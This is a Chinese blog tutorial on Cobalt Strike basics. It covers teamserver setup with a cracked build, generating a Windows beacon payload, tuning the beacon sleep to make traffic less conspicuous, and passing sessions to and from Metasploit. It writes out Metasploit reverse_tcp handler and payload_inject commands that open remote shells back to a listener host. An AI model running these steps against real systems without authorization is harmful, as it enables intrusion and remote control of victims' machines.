---
title: "CobaltStrike基本功能与使用"
categories: [ "安全技术","工具分享" ]
tags: [ "webshell","渗透工具","渗透测试","cobaltstrike" ]
draft: false
slug: "483"
date: "2020-02-06 10:55:00"
---

## 事情起因

`CobaltStrike`是老牌工具了，我还没写过

## 0x01 简介

> Cobalt Strike 一款以 Metasploit 为基础的 GUI 框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，exe、powershell 木马生成等。钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等。Cobalt Strike 主要用于团队作战，可谓是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和 sessions。Cobalt Strike 作为一款协同 APT 工具，针对内网的渗透测试和作为 apt 的控制终端功能，使其变成众多 APT 组织的首选。

## 0x02 安装启动

### 安装

> Cobalt Strike 分为客户端和服务端，可分布式操作、协同作战。服务器端只能运行在 Linux 系统中，可搭建在 VPS 上。

我这里使用的`t00ls`论坛的`cobaltstrike_v3.14`版本

服务端关键的文件是`teamserver`以及`cobaltstrike.jar`，将这两个文件放到服务器上同一个目录，然后运行：

```
chmod +x teamserver
./teamserver 192.168.1.2 soapffz
# 服务端真实IP(不能使用0.0.0.0或127.0.0.1)和连接密码
```

![][1]

`cobaltstrike`支持的`java`版本必须在这些之上：

```
OpenJDK 11
Oracle Java 11
Oracle Java 1.8
```

不然就会报错，按照官方推荐的[安装方法][2]安装即可

```
apt-get install openjdk-11-jdk -y
```

### 启动

`Linux`和`Windows`下都可以使用这条命令启动：

```
java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC  -jar cobaltstrike.jar
```

如果没有汉化文件也不会报错，只会提示你没有这个文件

当然，`Windows下也可以直接点击`cobaltstrike.bat`启动：

![][3]

这里的用户名可以随便填，就是你的登录到`cs`之后的用户名:

![][4]

## 0x03 简单上线示范

`cs`的参数太多了，如果是英文版的可以看下面的参考文章自行对比使用

我这里就简单示范一下基本的生成`payload`获得`shell`的过程

点击上面菜单的`Attack`(攻击)，点击`Packages`(生成后门中)的`Windows Executable`

有`S`的版本中的说明说的是无状态的。

![][5]

添加一个监听器：

![][6]

在这个版本中，提供了`9`个监听器：

![][7]

`beacon_xx`系列为`Cobalt Strike`自身，包括`dns`、`http`、`https`、`smb`四种方式的监听器。

`foreign`系列为外部监听器，通常与`MSF`或者`Armitage`联动。

在`Cobalt Strike`3.13 版本后增加了一个新的`Listeners (windows/beacon_tcp/bind_tcp)`，它支持`linuxSSH`会话。

### 创建一个监听器

![][8]

### 上线

上线成功：

![][9]

右键目标进入`beacon`(interact)

![][10]

在`Cobalt Strike`中，默认心跳为`60`s，执行命令的响应很慢，在下载文件时更加明显

所以根据实战环境把时间降低，建议不要太快，否则流量会相对明显，在这里设置`sleep 10`。

![][11]

同时在`beacon`中，如果想对目标进行命令管理，需要在前面加上`shell`，如`shell whoami`、`shell ipconfig`等。

## 0x04 msf 与 cs 联动

### msf 获得 beacon shell

`cs`中自带`socks`功能，可以使用`socks`把`msf`带入目标主机内网进行扫描

我这里是内网环境，就不示范了，我示范下`beacon shell`如何传给`msf`

首先在`msf`使用我们的老朋友开启监听，但要注意的是，`payload`不要设置为`64`位的：

```
msfconsole
handler -H 192.168.1.2 -P 3456 -p windows/meterpreter/reverse_tcp
```

![][12]

然后选择目标主机右键选择派生会话(spawn)，新建一个`Listener`

并选择新建的`msf`的`Listener`

![][13]

然后`msf`就能收到会话，我的`cs`和`msf`运行在同一台机器上也可以

![][14]

### cs 获得 msf 会话

同样的，会话也能从`msf`传到`cs`，在`cs`中创建一个监听者，和上一步类似

这里`host`需要修改为`cs`客户端 IP，创建好之后便监听端口，等待着被控机连接。

![][15]

在`msf`中执行如下操作：

```
use exploit/windows/local/payload_inject
set payload windows/meterpreter/reverse_http
set lhost 192.168.1.10
set lport 5678
set DisablePayloadHandler true
set session 1
run
```

![][16]

把原来的会话删除掉，执行`run`后你就能看到会话又回来了

本文完。

参考文章：

- [CobaltStrike 基本功能与使用][17]
- [CobaltStrike 与 Metasploit 实战联动][18]

[1]: https://img.soapffz.com/archives_img/2020/02/06/archives_20200206_110703.png
[2]: https://www.cobaltstrike.com/help-java-dependency
[3]: https://img.soapffz.com/archives_img/2020/02/06/archives_20200209_130506.png
[4]: https://img.soapffz.com/archives_img/2020/02/06/archives_20200209_130448.png
[5]: https://img.soapffz.com/archives_img/2020/02/06/archives_20200209_132108.png
[6]: https://img.soapffz.com/archives_img/2020/02/06/archives_20200209_132158.png
[7]: https://img.soapffz.com/archives_img/2020/02/06/archives_20200209_131336.png
[8]: https://img.soapffz.com/archives_img/2020/02/06/archives_20200209_132350.png
[9]: https://img.soapffz.com/archives_img/2020/02/06/archives_20200209_132531.png
[10]: https://img.soapffz.com/archives_img/2020/02/06/archives_20200209_132615.png
[11]: https://img.soapffz.com/archives_img/2020/02/06/archives_20200209_133019.png
[12]: https://img.soapffz.com/archives_img/2020/02/06/archives_20200209_133753.png
[13]: https://img.soapffz.com/archives_img/2020/02/06/archives_20200209_134619.png
[14]: https://img.soapffz.com/archives_img/2020/02/06/archives_20200209_135201.png
[15]: https://img.soapffz.com/archives_img/2020/02/06/archives_20200209_135648.png
[16]: https://img.soapffz.com/archives_img/2020/02/06/archives_20200209_140019.png
[17]: https://payloads.cn/2019/1204/cobaltstrike-basic-functions-and-use.html
[18]: https://payloads.cn/2019/1211/cobaltstrike-and-metasploit-combat-linkage.html